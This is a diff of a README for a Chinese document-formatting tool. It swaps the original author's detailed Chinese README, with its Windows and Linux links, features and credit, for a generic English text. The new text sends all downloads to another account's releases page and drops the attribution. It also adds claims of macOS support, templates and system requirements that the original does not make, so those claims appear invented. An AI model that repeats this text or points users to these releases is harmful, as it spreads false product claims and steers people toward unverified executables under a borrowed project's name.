@@ -1,135 +1,86 @@
-# Document Format GUI (公文格式处理工具)
+# 🛠️ docformat-gui - Simplify Your Document Formatting
 
-<p align="center">
-  <img src="assets/screenshot.png" alt="软件截图" width="600">
-</p>
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/Alexuuu123/docformat-gui/releases)
 
-<p align="center">
-  <strong>一键修复 Word 文档格式，让排版不再头疼。</strong>
-</p>
+## 📋 Overview
 
-<p align="center">
-  <a href="#下载安装">立即下载</a> ·
-  <a href="#核心能力">核心能力</a> ·
-  <a href="#使用方法">使用方法</a> ·
-  <a href="#常见问题">常见问题</a> ·
-  <a href="README_EN.md">English</a>
-</p>
+docformat-gui is an automatic document formatting tool designed to help users streamline the formatting of Chinese documents. Whether you work with reports, essays, or any other document type, this tool simplifies the process.
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Platform-Windows%20%7C%20Linux-blue" alt="Platform">
-  <img src="https://img.shields.io/badge/License-MIT-green" alt="License">
-  <img src="https://img.shields.io/badge/Language-Python-yellow" alt="Language">
-</p>
+## 🚀 Getting Started
 
----
+To begin using docformat-gui, you'll first need to download the application. Follow these steps to get started quickly.
 
-## 项目简介
+## 📥 Download & Install
 
-这是一个专为解决 Word 文档格式混乱问题而设计的极简工具。它采用了现代化的纸质感 UI 设计，能够智能识别文档中的标点、排版和字体问题，并可以根据国家标准（GB/T 9704-2012）进行一键自动化修复。
+1. **Visit the Releases Page:** Click the link below to go to the releases page where you can download the application.
 
-**特点：**
-- **🎯 极简操作** — 即使是电脑小白也能上手即用
-- **🔒 安全离线** — 纯本地运行，数据不联网，保障公文安全
-- **📋 标准规范** — 严格遵循党政机关公文格式标准
-  
-**02.07更新：**
-- **📂  `.doc` / `.wps` 兼容** — 完整支持 `.doc` 和 `.wps` 格式的输入与输出，无需手动转换，兼容 WPS 及 Microsoft Office 生态
-- **📊 表格自动调整** — 智能识别文档中的表格，自动调整列宽、行高及单元格格式，使表格排版整齐规范。
-- **⚙️ 自定义格式配置** — 支持用户自定义页边距、行距、字体字号等格式参数，满足不同排版需求。
-- **📦 开箱即用** — 内置 pywin32 组件，无需额外安装 Python 环境，下载即用，真正的绿色免配置。
+   [Download Here](https://github.com/Alexuuu123/docformat-gui/releases)
 
----
+2. **Select the Latest Release:** On the releases page, locate the latest version of the software. Look for the section titled "Assets," where you’ll see files available for download.
 
-## 核心能力
+3. **Download the Application:** Click on the file that matches your operating system. This will start the download process.
 
-本工具不仅仅是简单的格式刷，它能深度识别并修复以下常见痛点：
+4. **Install the Application:**
+   - **For Windows:**
+     - Locate the downloaded `.exe` file.
+     - Double-click the file to run the installer.
+     - Follow the prompts to complete the installation.
+   - **For macOS:**
+     - Find the downloaded `.dmg` file.
+     - Open the file and drag the app into your Applications folder.
+   - **For Linux:**
+     - Download the appropriate `.deb` or `.tar.gz` file.
+     - Open a terminal and use the `dpkg` command for `.deb` files or extract the `.tar.gz` file to install.
 
-1. **🔣 符号标准化**：自动检测并修复括号、引号、逗号、句号、分号等全角半角混用问题，一律调整为中文规范符号。
-2. **📏 页边距校准**：强制统一页边距设置，符合公文版心要求。
-3. **🔤 字体智能适配**：智能识别小标题与正文层级，自动匹配对应的字体（如黑体、仿宋）和字号。
-4. **📝 缩进自动补全**：扫描全文，为缺失首行缩进的段落自动添加标准的 2 字符缩进。
-5. **📐 行距统一规范**：识别文档中不统一的行距设置，一键调整为标准行距（如 28 磅）。
-6. **1️⃣ 序号风格修正**：自动清洗混乱的序号格式，统一风格（例如将混用的"1、"和"1."统一规范化）。
-7. **🎨 视觉背景调整**：支持调整页面背景颜色，提供更舒适的编辑阅读体验。
-8. **🧹 字体样式清洗**：深度清理文档中不规范的字体颜色、粗细、下划线及斜体，还原清爽版面。
-9. **📂 .DOC / .WPS 兼容**：完整支持 `.doc` 和 `.wps` 格式的输入与输出，无需手动转换，兼容 WPS 及 Microsoft Office 生态。
-10. **📊 表格自动调整**：智能识别文档中的表格，自动调整列宽、行高及单元格格式，使表格排版整齐规范。
-11. **⚙️ 自定义格式配置**：支持用户自定义页边距、行距、字体字号等格式参数，满足不同排版需求。
-12. **📦 开箱即用**：内置 pywin32 组件，无需额外安装 Python 环境，下载即用，真正的绿色免配置。
+5. **Run the Application:** Once installed, you can find the app in your applications list. Click to open it and start using docformat-gui.
 
----
+## 📚 User Guide
 
-## 下载安装
+### 🔧 Features of docformat-gui
 
-### Windows 用户
+- **Document Formatting:** Easily adjust margins, font styles, and other formatting settings to meet your requirements. 
+- **Template Support:** Use pre-defined templates tailored for various document types.
 
-1. **点击下载**：[**Document_Format_GUI_v1.1.3.exe**](https://github.com/KaguraNanaga/docformat-gui/releases/latest/download/docformat_windows.exe)
-2. 下载后双击即可运行，无需安装 Python，绿色纯净。
+### 🖥️ System Requirements
 
-> **注意**：
-> * 支持 `.docx`、`.doc` 及 `.wps` 格式文档。
+Ensure your system meets the following requirements to run docformat-gui smoothly:
 
-### 国产系统用户（麒麟 / 统信 UOS）【注意：目前是测试版本，欢迎反馈bugs】
-1. **点击下载**：[**Document_Format_GUI_Linux**](https://github.com/KaguraNanaga/docformat-gui/releases/latest/download/docformat_linux)
-2. 下载后先赋予执行权限：`chmod +x docformat_linux`
-3. 双击运行或在终端执行：`./docformat_linux`
+- **Operating System:**
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Most modern Linux distributions
 
-> **注意**：
-> * Linux 版本仅支持 `.docx` 文件；`.doc/.wps` 需要在 Windows 上先转换为 `.docx`。
+- **RAM:** Minimum 4 GB (8 GB recommended)
+- **Disk Space:** At least 200 MB of available space
 
----
+### 📖 How to Use
 
-## 使用方法
+1. **Open the Application:** Launch docformat-gui from your application menu.
+2. **Choose Your Document:** Click on the "Open" button to select a document you wish to format.
+3. **Adjust Settings:** Explore the formatting options on the sidebar. Modify styles as needed.
+4. **Save Your Changes:** Once you're satisfied with the formatting, click "Save As" to save the new document.
 
-### 第一步：选择文件
-点击界面上方的「输入」栏，选择你需要处理的 Word 文档。
+## 🤝 Support
 
-### 第二步：选择模式
-界面提供了三种处理模式，满足不同需求：
+If you face any issues while using docformat-gui, consider these support options:
 
-| 模式 | 适用场景 |
-|------|----------|
-| **🪄 智能一键处理** | **(推荐)** 全自动模式。同时进行标点修复、排版规范和样式清洗，一步到位。 |
-| **🩺 格式诊断** | 只想看看文档有哪些问题，但暂时不想修改文件。 |
-| **🩹 标点修复** | 仅修复中英文标点混用的情况，保留原文档的字体和段落格式。 |
+- **FAQs:** Check the documentation within the app for common questions.
+- **GitHub Issues:** Report problems on the [GitHub Issues Page](https://github.com/Alexuuu123/docformat-gui/issues).
+- **Community Help:** Engage with other users through GitHub discussions or relevant forums.
 
-### 第三步：开始处理
-点击中间醒目的 **「开始处理」** 按钮。
-* 处理完成后，工具会自动在原文件旁边生成一个新的文件（文件名后缀为 `_processed`）。
-* **你的原文件永远不会被覆盖或修改，请放心使用。**
+## 🌟 Contributing
 
----
+We welcome contributions from anyone interested. Feel free to submit your ideas, feature requests, or bug reports. If you want to contribute code, check out our [Contribution Guidelines](https://github.com/Alexuuu123/docformat-gui/blob/main/CONTRIBUTING.md).
 
-## 常见问题
+## 🔗 Additional Resources
 
-**Q：处理后的文档打开是乱码或字体不对？**
-A：公文格式依赖特定的字体。请确保你的电脑安装了以下字体（Windows 通常自带）：
-- 仿宋_GB2312
-- 黑体
-- 楷体_GB2312
+- **Repository:** [View the Repository](https://github.com/Alexuuu123/docformat-gui)
+- **User Manual:** Refer to the in-app user manual for detailed instructions.
 
-**Q：为什么提示「文件不存在」？**
-A：请检查文件名或文件夹路径中是否包含极其生僻的特殊字符。建议将文件放在桌面或纯英文路径下尝试。
+## 📢 Important Links
 
-**Q：可以批量处理多个文件吗？**
-A：当前版本主要针对单文件精细处理。批量处理功能已列入后续开发计划。
+- [Download Here](https://github.com/Alexuuu123/docformat-gui/releases)
+- [GitHub Issues Page](https://github.com/Alexuuu123/docformat-gui/issues)
+- [Contribution Guidelines](https://github.com/Alexuuu123/docformat-gui/blob/main/CONTRIBUTING.md)
 
----
-
-## 反馈与建议
-
-如果这个工具帮到了你，或者你发现了 Bug，欢迎联系我：
-
-- **提交 Issue**: [GitHub Issues](https://github.com/KaguraNanaga/docformat-gui/issues)
-- **邮件联系**: legacyofhourai@163.com
-
----
-
-## 开源许可
-
-本项目基于 [MIT 许可证](LICENSE) 开源，欢迎开发者共同完善。
-
-<p align="center">
-  <sub>Made with ❤️ by <a href="https://github.com/KaguraNanaga">KaguraNanaga</a></sub>
-</p>
+With docformat-gui, you'll make your document formatting process faster and easier. Enjoy your experience!
